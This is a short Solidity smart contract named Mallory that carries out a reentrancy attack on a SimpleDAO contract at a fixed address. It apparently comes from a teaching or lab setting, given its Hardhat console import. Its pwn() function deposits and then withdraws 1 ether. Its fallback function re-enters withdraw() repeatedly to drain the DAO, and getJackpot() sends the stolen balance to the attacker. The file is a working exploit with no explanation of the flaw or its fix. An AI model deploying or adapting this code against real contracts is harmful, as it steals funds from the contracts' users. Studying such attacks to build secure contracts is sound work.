// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

import "hardhat/console.sol";
import "./DAO.sol";

contract Mallory {
    SimpleDAO public dao = SimpleDAO(0xd9145CCE52D386f254917e481eB44e9943F39138);
    address owner;

    constructor () {
        owner = msg.sender;
    }

    fallback () external payable {
        console.log("In the fallback");
        if (address(0xd9145CCE52D386f254917e481eB44e9943F39138).balance >= 1 ether)
        {
            dao.withdraw(1 ether); 
        }
    } 

    function pwn() payable public {
        dao.donate{value: 1 ether}();
        dao.withdraw(1 ether);
    }

    
    function getJackpot() public { 
        payable(owner).send(address(this).balance);
    }
}